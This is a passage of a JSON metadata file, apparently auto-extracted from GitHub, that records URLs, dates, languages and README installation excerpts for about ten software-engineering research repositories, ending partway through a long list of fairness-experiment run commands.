                    "value": "2024-07-28T16:53:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 21897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "318": {
        "filename": "JasperSurmont_cosmos-sdk-codeql_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JasperSurmont/cosmos-sdk-codeql",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-09T10:14:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-06T15:16:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "CodeQL",
                    "name": "CodeQL",
                    "type": "Programming_language",
                    "size": 11563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "319": {
        "filename": "JetBrains-Research_commit_message_generation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JetBrains-Research/commit_message_generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\r\n> :star2: Useful links: [our dataset](https://huggingface.co/datasets/JetBrains-Research/commit-chronicle) and/or [the repo](https://github.com/saridormi/commits_dataset) we used for data preparation. \r\n\r\n<details>\r\n<summary>:yellow_heart: click here for more information on required data format</summary>\r\n\r\nThis project expects each dataset part to be stored in a separate JSONLines files:\r\n```\r\n \u251c\u2500\u2500 ...  # data directory\r\n \u2502   \u251c\u2500\u2500 train.jsonl\r\n \u2502   \u251c\u2500\u2500 val.jsonl\r\n \u2502   \u2514\u2500\u2500 test.jsonl\r\n \u2514\u2500\u2500 ...\r\n```\r\n\r\nIn our case, each input example is commit. Also note that commits from each author should be in chronological order. Specifically, the following keys are expected in each row:\r\n\r\n* `author`: Unique identifier for the author of commit.\r\n* `message`: Commit message.\r\n* `mods`: A list of modification made in a commit. Each modification should contain the following keys:\r\n  * `change_type`: Type of modification (string, one of `MODIFY`, `ADD`, `DELETE`, `RENAME`, `COPY`, `UNKNOWN`).\r\n  * `old_path`: Path to file before the commit (`None` when `change_type` is `ADD`).\r\n  * `new_path`: Path to file after the commit (`None` when `change_type` is `DELETE`).\r\n  * `diff`: Output of the `git diff` command for this specific file.\r\n\r\n</details>\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Prepare raw data",
                    "parent_header": [
                        "From Commit Message Generation to History-Aware Commit Message Completion",
                        "How to use",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/commit_message_generation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-16T14:12:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T11:12:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 321849
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4059
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "320": {
        "filename": "setu1421_SecretBench_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/setu1421/SecretBench",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " - Setu Kumar Basak (sbasak4@ncsu.edu)\n - Lorenzo Neil (lcneil@ncsu.edu)\n - Bradley Reaves (bgreaves@ncsu.edu)\n - Laurie Willams (lawilli3@ncsu.edu) \n  \n",
                    "original_header": "Authors:"
                },
                "confidence": 0.947657590785864,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/setu1421/SecretBench/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-20T16:39:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T03:34:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "321": {
        "filename": "tdurieux_Travis-Listener_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tdurieux/Travis-Listener",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The Build Saver Plugin listens to the Travis Crawler Service and saves all information to the database.\nWe save the following information: TravisCI's job, TravisCI's build, commit information (not including the diff), repository information, and user information.\nThe goal of this plugin is to track all changes, and provide statistics on who is using TravisCI.\n \n",
                    "original_header": "<a href=\"plugins/buildsaver\">Build Saver Plugin</a>"
                },
                "confidence": 0.924497475480737,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/Travis-Listener/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The Restarted Build Plugin collects the information relevant to the present study.  \nIts goal is to detect restarted builds on TravisCI.\nWhen a build is restarted by a developer, all the original information is overwritten.  Tracking restarted builds thus requires live collection of build data (in our case, using the Build Saver Plugin).\nTo detect restarted builds, the Restarted Build Plugin crawls periodically (once a day) the collected builds from the 30 previous days, comparing the build start timestamp provided by the TravisCI' API to the start time saved by the Build Saver Plugin. \nIf the two times differ, the build was restarted.\nFor each restarted build, we collect the new TravisCI job information and execution logs.\n \n",
                    "original_header": "<a href=\"plugins/restartedbuilds\">Restarted Build Plugin</a>"
                },
                "confidence": 0.9999490316396893,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/Travis-Listener/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-08T03:59:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-16T20:15:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 180948
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 29116
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 7783
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1390
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "322": {
        "filename": "CeON_chrum_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CeON/chrum",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "As this version may still have some bugs, we are open for bug reports or pull requests with fixes.\n \n",
                    "original_header": "chrum - The Apache Oozie Workflow Generator"
                },
                "confidence": 0.9991298247081384,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CeON/chrum/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2012-11-23T15:15:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2016-07-21T03:50:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 28867
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "323": {
        "filename": "MalihehIzadi_nlp4se_eval_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MalihehIzadi/nlp4se_eval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-29T09:38:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-04-01T06:28:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "324": {
        "filename": "gotec_gambit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gotec/gambit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "`gambit` is pure `python` code. It has no platform-specific dependencies and thus works on all\nplatforms. Assuming you are using `pip`, you can install latest version of `gambit` by running:\n\n```\n> pip install gambit-disambig\n```\n\nThis also installs the necessary dependencies. `gambit` depends on the `python-Levenshtein` package to compute Levenshtein distances for edited lines of code. On sytems running Windows, automatically compiling this C based module might fail during installation. In this case, unofficial Windows binaries can be found [here](https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-levenshtein), which might help you get started.\n",
                    "type": "Text_excerpt",
                    "original_header": "Download and installation",
                    "parent_header": [
                        "gambit"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gotec/gambit/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-28T21:15:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-21T15:45:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18283
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 8500
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "325": {
        "filename": "google-research_r_u_sure_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/google-research/r_u_sure",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "If you would like to install the R-U-SURE library on your own system, you can\nfollow the instructions below.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "R-U-SURE? Uncertainty-Aware Code Suggestions By Maximizing Utility Across Random User Intents"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/google-research/r_u_sure/main/README.md"
            },
            {
                "result": {
                    "value": "It is highly recommended to install this package into a virtual environment,\nas it currently depends on a patched version of `numba` that may be incompatible\nwith a global installation.\n\nTo create and activate a virtual environment, you can run the Bash commands\n\n```\n# you can use any path here\nvenv_path=\"$HOME/venvs/rusure\"\npython3 -m venv $venv_path\nsource $venv_path/bin/activate\necho \"Active virtual environment is: $VIRTUAL_ENV\"\n```\n\n(On Linux, you may need to run `sudo apt-get install python3-venv` first.)\n",
                    "type": "Text_excerpt",
                    "original_header": "Prerequisite: Setting up a virtual environment",
                    "parent_header": [
                        "R-U-SURE? Uncertainty-Aware Code Suggestions By Maximizing Utility Across Random User Intents",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/google-research/r_u_sure/main/README.md"
            },
            {
                "result": {
                    "value": "If you want to use the `r_u_sure` package from Python without modifying it, you\ncan directly install it from GitHub using `pip`:\n\n```\n# Optional: disable some unused numba features to prevent build errors\nexport NUMBA_DISABLE_TBB=1\nexport NUMBA_DISABLE_OPENMP=1\n\npip install \"r_u_sure @ git+https://github.com/google-research/r_u_sure\"\n```\n\n`pip` will then automatically install the most recent version of the package\nand make it available from Python via `import r_u_sure`.\n\nNote that you can also add `r_u_sure @ git+https://github.com/google-research/r_u_sure`\nto your `requirements.txt` or `pyproject.toml` files if you are developing a\npackage that depends on R-U-SURE.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing the package directly from GitHub",
                    "parent_header": [
                        "R-U-SURE? Uncertainty-Aware Code Suggestions By Maximizing Utility Across Random User Intents",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/google-research/r_u_sure/main/README.md"
            },
            {
                "result": {
                    "value": "If you prefer to download the R-U-SURE source files manually, or if you would\nlike to contribute to the R-U-SURE library, you can perform a local installation.\nStart by cloning this GitHub repository:\n\n```\ngit clone https://github.com/google-research/r_u_sure\ncd r_u_sure\n```\n\nNext, install it:\n\n```\n# Optional: disable some unused numba features to prevent build errors\nexport NUMBA_DISABLE_TBB=1\nexport NUMBA_DISABLE_OPENMP=1\n\npip install -e .\n```\n\nLocal edits to the source files will now be reflected properly in the python\ninterpreter.\n\n(If you'd prefer, you can also omit the `export NUMBA_DISABLE_{X}=1` lines to\ncompile those features into numba. Those features have additional dependencies;\nsee the [Numba documentation][numba-opt-deps].)\n\n[numba-opt-deps]: https://numba.readthedocs.io/en/stable/user/installing.html#build-time-environment-variables-and-configuration-of-optional-components\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing from source",
                    "parent_header": [
                        "R-U-SURE? Uncertainty-Aware Code Suggestions By Maximizing Utility Across Random User Intents",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/google-research/r_u_sure/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-10T02:10:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-14T03:27:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2867115
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1312223
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "326": {
        "filename": "ali-ghanbari_deepmufl-ase-2023_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ali-ghanbari/deepmufl-ase-2023",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run `deepmufl`, one needs to first create a Conda virtual environment based on the file `requirements.txt`.\nWe have used [Miniconda](https://docs.conda.io/en/latest/miniconda.html#linux-installers) 4.13.0 on 64 Ubuntu Linux (both 18 and 22) to test `deepmufl`.\n```shell\nconda create --name deepmufl-env --file requirements.txt\n```\nOnce created, one can enter the virtual environment using the following command.\nBASH2*\nWe are now ready to `deepmufl`.\nThe source code of the tool is located under the directory `src`.\nThe module `main.py` is the entry point for the program.\nOne can run the tool as follows.\nBASH3*\nThe first argument to `main.py` is the `h5` file name for the buggy model.\nThe second argument is the rate of mutation selection, which is intended to be a real value between 0 and 1.0, with 0.0 meaning no mutation and 1.0 meaning all the generated mutants should be tested 100% \nThe next two arguments are the file names for the numpy arrays, stored as `.npy` files, for inputs and outputs.\nNext the argument `class` (or `classification`) indicate that the input model is a classifier.\nAlternatively we could pass the value `reg` (or `regression`) to signify that the input model is a classifier model.\nLastly, the optional argument `0.001` is the delta value for comparing floating-point values, i.e., two floating-point will be deemed equal if their absolute difference is no more than the delta.\nBy default this value is set to 1e-3.\n \n",
                    "original_header": "Source Code"
                },
                "confidence": 0.9897156746532838,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ali-ghanbari/deepmufl-ase-2023/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-31T17:56:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-22T15:16:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 165543
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "327": {
        "filename": "chenzhenpeng18_ICSE24-Multi-Attribute-Fairness_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In order to facilitate the replication of our study, we provide a docker image, which can be downloaded from https://drive.google.com/file/d/1AWm6U0Cdv5KEpN_6EguHZrVL2hK_Vcze/view?usp=sharing. The docker image includes all the required libraries, datasets, and dependencies for this study. Based on the docker image, you can directly replicate our study following the instructions in the Reproduction and Step-by-step Guide sections.\n\nTo use the docker image to replicate our study, you need to \n\n(1) install docker (https://www.docker.com/).\n\n(2) use docker to load the image using the command: \n\t\n\tdocker load -i icse24.tar\n\n(3) excute the image using the commands:\n\n\tdocker run --name icse24_test -idt image_icse24\n\n\tdocker exec -it icse24_test /bin/bash\n\n(4) activate the conda visual environment aif360 using the command:\n\t\n\tconda activate aif360\n\nWe have included all the code and data of our study in the ```root/ICSE24``` folder of the docker image. You can run the code according to our instructions in the Reproduction and Step-by-step Guide sections.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "We have provided the original datasets that we use in this folder. The download link of each dataset is provided as a reference in the paper. We use the data processing scripts provided by [previous work](https://ieeexplore.ieee.org/document/9951398) to process the datasets. We have included the original datasets, the data processing scripts, and the processed datasets in the ```Dataset``` folder.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Datasets",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "* ```Analysis_code/``` contains the scripts for producing the results for all RQs. You can reproduce all the results based on the intermediate results provided by us by running ```rq1.py```, ```rq2.py```, ```rq3_1.py```, ```rq3_2.py```, and ```rq4.py```.\n\n* ```Fair360/``` and ```Fair3602/``` contain the scripts for implementing fairness improvement methods from the ML community and MAAT proposed by [Chen et al.](https://dl.acm.org/doi/10.1145/3540250.3549093) at ESEC/FSE 2022. The two folders contain the code for dealing a single protected attribute and multiple protected attributes, respectively.\n\n* ```FairMask/``` and ```FairMask2/``` contain the scripts for implementing FairMask, a fairness improvement method proposed by [Peng et al.](https://ieeexplore.ieee.org/document/9951398) at IEEE TSE 2022. The two folders contain the code for dealing a single protected attribute and multiple protected attributes, respectively.\n\n* ```Fair-SMOTE/``` and ```Fair-SMOTE2/``` contains code for implementing Fair-SMOTE, a fairness improvement method proposed by [Chakraborty et al.](https://doi.org/10.1145/3468264.3468537) at ESEC/FSE 2021.\n\n* ```Fairea_multi/``` contains the scripts of the benchmarking tool namely Fairea.\n\n* ```Cal_baseline/``` contains the scripts for generating trade-off baselines using Fairea.\n\n* ```Fairea_baseline_multi/``` contains the generated baseline data.\n\n* ```aif360.zip``` contains the scripts (provided by [Zhang and Sun](https://github.com/zhangmengling/Adaptive_Fairness_Improvement) at ESEC/FSE 2022) of adapting fairness improvement methods from the ML community to make them applicable to multiple protected attributes.\n  \n* ```Results/``` contains the raw results of applying each fairness improvement method in each scenario with a single protected attribute. Each file in this folder has 21 columns, with the first column indicating the metric, and the next 20 columns the metric values of 20 runs.\n\n* ```Results_multi/``` contains the raw results of applying each fairness improvement method in each scenario with multiple protected attributes. Each file in this folder has 21 columns, with the first column indicating the metric, and the next 20 columns the metric values of 20 runs.\n",
                    "type": "Text_excerpt",
                    "original_header": "Scripts and results",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "You can also reproduce the results from scratch. We provide the step-by-step guide on how to reproduce the intermediate results and obtain the results for RQs based on them.\n",
                    "type": "Text_excerpt",
                    "original_header": "Usage (Step-by-step Guide)",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "This RQ investigates the negative side effect of single-attribute fairness improvement by studying its impact on fairness regarding the unconsidered protected attributes. \n\n(1) To answer this RQ, we need to run the code of each fairness improvement method on tasks with single protected attributes. Each fairness improvement method supports three arguments: `-d` configures the dataset; `-c` configures the machine learning algorithm; `-p` configures the protected attribute. We apply each fairness improvement method for 5*2*4=40 (dataset, protected attribute, ML algorithm) tasks. We can achieve this by running the code as follows:\n\n```\ncd\ncd ICSE24/Fair360\npython default.py -d adult -c lr -p sex\npython default.py -d adult -c rf -p sex\npython default.py -d adult -c svm -p sex\npython default_dl.py -d adult -c dl -p sex\npython default.py -d adult -c lr -p race\npython default.py -d adult -c rf -p race\npython default.py -d adult -c svm -p race\npython default_dl.py -d adult -c dl -p race\npython default.py -d compas -c lr -p sex\npython default.py -d compas -c rf -p sex\npython default.py -d compas -c svm -p sex\npython default_dl.py -d compas -c dl -p sex\npython default.py -d compas -c lr -p race\npython default.py -d compas -c rf -p race\npython default.py -d compas -c svm -p race\npython default_dl.py -d compas -c dl -p race\npython default.py -d default -c lr -p sex\npython default.py -d default -c rf -p sex\npython default.py -d default -c svm -p sex\npython default_dl.py -d default -c dl -p sex\npython default.py -d default -c lr -p age\npython default.py -d default -c rf -p age\npython default.py -d default -c svm -p age\npython default_dl.py -d default -c dl -p age\npython default.py -d mep1 -c lr -p sex\npython default.py -d mep1 -c rf -p sex\npython default.py -d mep1 -c svm -p sex\npython default_dl.py -d mep1 -c dl -p sex\npython default.py -d mep1 -c lr -p race\npython default.py -d mep1 -c rf -p race\npython default.py -d mep1 -c svm -p race\npython default_dl.py -d mep1 -c dl -p race\npython default.py -d mep2 -c lr -p sex\npython default.py -d mep2 -c rf -p sex\npython default.py -d mep2 -c svm -p sex\npython default_dl.py -d mep2 -c dl -p sex\npython default.py -d mep2 -c lr -p race\npython default.py -d mep2 -c rf -p race\npython default.py -d mep2 -c svm -p race\npython default_dl.py -d mep2 -c dl -p race\npython rw.py -d adult -c lr -p sex\npython rw.py -d adult -c rf -p sex\npython rw.py -d adult -c svm -p sex\npython rw_dl.py -d adult -c dl -p sex\npython rw.py -d adult -c lr -p race\npython rw.py -d adult -c rf -p race\npython rw.py -d adult -c svm -p race\npython rw_dl.py -d adult -c dl -p race\npython rw.py -d compas -c lr -p sex\npython rw.py -d compas -c rf -p sex\npython rw.py -d compas -c svm -p sex\npython rw_dl.py -d compas -c dl -p sex\npython rw.py -d compas -c lr -p race\npython rw.py -d compas -c rf -p race\npython rw.py -d compas -c svm -p race\npython rw_dl.py -d compas -c dl -p race\npython rw.py -d default -c lr -p sex\npython rw.py -d default -c rf -p sex\npython rw.py -d default -c svm -p sex\npython rw_dl.py -d default -c dl -p sex\npython rw.py -d default -c lr -p age\npython rw.py -d default -c rf -p age\npython rw.py -d default -c svm -p age\npython rw_dl.py -d default -c dl -p age\npython rw.py -d mep1 -c lr -p sex\npython rw.py -d mep1 -c rf -p sex\npython rw.py -d mep1 -c svm -p sex\npython rw_dl.py -d mep1 -c dl -p sex\npython rw.py -d mep1 -c lr -p race\npython rw.py -d mep1 -c rf -p race\npython rw.py -d mep1 -c svm -p race\npython rw_dl.py -d mep1 -c dl -p race\npython rw.py -d mep2 -c lr -p sex\npython rw.py -d mep2 -c rf -p sex\npython rw.py -d mep2 -c svm -p sex\npython rw_dl.py -d mep2 -c dl -p sex\npython rw.py -d mep2 -c lr -p race\npython rw.py -d mep2 -c rf -p race\npython rw.py -d mep2 -c svm -p race\npython rw_dl.py -d mep2 -c dl -p race\npython dir.py -d adult -c lr -p sex\npython dir.py -d adult -c rf -p sex\npython dir.py -d adult -c svm -p sex\npython dir_dl.py -d adult -c dl -p sex\npython dir.py -d adult -c lr -p race\npython dir.py -d adult -c rf -p race\npython dir.py -d adult -c svm -p race\npython dir_dl.py -d adult -c dl -p race\npython dir.py -d compas -c lr -p sex\npython dir.py -d compas -c rf -p sex\npython dir.py -d compas -c svm -p sex\npython dir_dl.py -d compas -c dl -p sex\npython dir.py -d compas -c lr -p race\npython dir.py -d compas -c rf -p race\npython dir.py -d compas -c svm -p race\npython dir_dl.py -d compas -c dl -p race\npython dir.py -d default -c lr -p sex\npython dir.py -d default -c rf -p sex\npython dir.py -d default -c svm -p sex\npython dir_dl.py -d default -c dl -p sex\npython dir.py -d default -c lr -p age\npython dir.py -d default -c rf -p age\npython dir.py -d default -c svm -p age\npython dir_dl.py -d default -c dl -p age\npython dir.py -d mep1 -c lr -p sex\npython dir.py -d mep1 -c rf -p sex\npython dir.py -d mep1 -c svm -p sex\npython dir_dl.py -d mep1 -c dl -p sex\npython dir.py -d mep1 -c lr -p race\npython dir.py -d mep1 -c rf -p race\npython dir.py -d mep1 -c svm -p race\npython dir_dl.py -d mep1 -c dl -p race\npython dir.py -d mep2 -c lr -p sex\npython dir.py -d mep2 -c rf -p sex\npython dir.py -d mep2 -c svm -p sex\npython dir_dl.py -d mep2 -c dl -p sex\npython dir.py -d mep2 -c lr -p race\npython dir.py -d mep2 -c rf -p race\npython dir.py -d mep2 -c svm -p race\npython dir_dl.py -d mep2 -c dl -p race\npython meta.py -d adult -c lr -p sex\npython meta.py -d adult -c lr -p race\npython meta.py -d compas -c lr -p sex\npython meta.py -d compas -c lr -p race\npython meta.py -d default -c lr -p sex\npython meta.py -d default -c lr -p age\npython meta.py -d mep1 -c lr -p sex\npython meta.py -d mep1 -c lr -p race\npython meta.py -d mep2 -c lr -p sex\npython meta.py -d mep2 -c lr -p race\npython adv.py -d adult -c lr -p sex\npython adv.py -d adult -c lr -p race\npython adv.py -d compas -c lr -p sex\npython adv.py -d compas -c lr -p race\npython adv.py -d default -c lr -p sex\npython adv.py -d default -c lr -p age\npython adv.py -d mep1 -c lr -p sex\npython adv.py -d mep1 -c lr -p race\npython adv.py -d mep2 -c lr -p sex\npython adv.py -d mep2 -c lr -p race\npython pr.py -d adult -c lr -p sex\npython pr.py -d adult -c lr -p race\npython pr.py -d compas -c lr -p sex\npython pr.py -d compas -c lr -p race\npython pr.py -d default -c lr -p sex\npython pr.py -d default -c lr -p age\npython pr.py -d mep1 -c lr -p sex\npython pr.py -d mep1 -c lr -p race\npython pr.py -d mep2 -c lr -p sex\npython pr.py -d mep2 -c lr -p race\npython eop.py -d adult -c lr -p sex\npython eop.py -d adult -c rf -p sex\npython eop.py -d adult -c svm -p sex\npython eop_dl.py -d adult -c dl -p sex\npython eop.py -d adult -c lr -p race\npython eop.py -d adult -c rf -p race\npython eop.py -d adult -c svm -p race\npython eop_dl.py -d adult -c dl -p race\npython eop.py -d compas -c lr -p sex\npython eop.py -d compas -c rf -p sex\npython eop.py -d compas -c svm -p sex\npython eop_dl.py -d compas -c dl -p sex\npython eop.py -d compas -c lr -p race\npython eop.py -d compas -c rf -p race\npython eop.py -d compas -c svm -p race\npython eop_dl.py -d compas -c dl -p race\npython eop.py -d default -c lr -p sex\npython eop.py -d default -c rf -p sex\npython eop.py -d default -c svm -p sex\npython eop_dl.py -d default -c dl -p sex\npython eop.py -d default -c lr -p age\npython eop.py -d default -c rf -p age\npython eop.py -d default -c svm -p age\npython eop_dl.py -d default -c dl -p age\npython eop.py -d mep1 -c lr -p sex\npython eop.py -d mep1 -c rf -p sex\npython eop.py -d mep1 -c svm -p sex\npython eop_dl.py -d mep1 -c dl -p sex\npython eop.py -d mep1 -c lr -p race\npython eop.py -d mep1 -c rf -p race\npython eop.py -d mep1 -c svm -p race\npython eop_dl.py -d mep1 -c dl -p race\npython eop.py -d mep2 -c lr -p sex\npython eop.py -d mep2 -c rf -p sex\npython eop.py -d mep2 -c svm -p 